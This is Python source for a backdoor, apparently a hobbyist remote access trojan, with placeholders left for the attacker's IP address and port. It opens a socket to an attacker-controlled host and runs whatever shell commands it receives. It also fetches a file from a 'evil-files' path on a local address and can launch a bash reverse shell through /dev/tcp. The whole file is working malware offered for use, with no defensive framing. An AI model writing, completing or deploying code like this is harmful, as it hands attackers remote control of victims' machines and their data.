import socket
import subprocess
import os
import requests

downloadURL = ['http://192.168.1.229/evil-files/mouse_troll.py']


class Backdoor:
    def __init__(self, ip, port):
        try:
            self.ip = ip
            self.port = port
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((ip, port))
            print('[+] Connected')
            self.commands()
        except:
            print('[-] Error')

    def commands(self):
        global downloadURL
        command = self.s.recv(1024)
        output = self.terminal_execute(command)
        self.s.send(output)
        while command:
            try:
                command = self.s.recv(1024)
                command = command.decode()
                if command[0:2] == 'cd':
                    command = command.split(' ')
                    result = self.change_cwd(command[1])
                    self.s.send(result.encode())
                elif command[0:8] == 'download':
                    self.download(downloadURL)
                    self.s.send('[+] Successfully downloaded'.encode())
                elif command[0:5] == 'shell':
                    self.reverseShell()
                elif command[0:6] == 'python':
                    self.python(command)
                else:
                    output = self.terminal_execute(command)
                    self.s.send(output)
            except Exception as e:
                self.s.send("Invalid command".encode())

    def python(self, command):
        try:
            subprocess.call(command)
            self.s.send("[+] Successfully run")
        except:
            self.s.send("[-] Error")

    def reverseShell(self):
        subprocess.call('bash -i >& /dev/tcp/192.168.1.229/8888 0>&1', shell=True)

    def terminal_execute(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except:
            self.s.send("[-] Error".encode())

    def download(self, url):
        for i in url:
            get_response = requests.get(i)
            file_name = i.split("/")[-1]
            with open(file_name, 'wb') as out_file:
                out_file.write(get_response.content)

    def change_cwd(self, path):
        os.chdir(path)
        return '[+] Changing current working directory to ' + path


backdoor = Backdoor([YOUR IP ADDRESS HERE], [PORT NUMBER])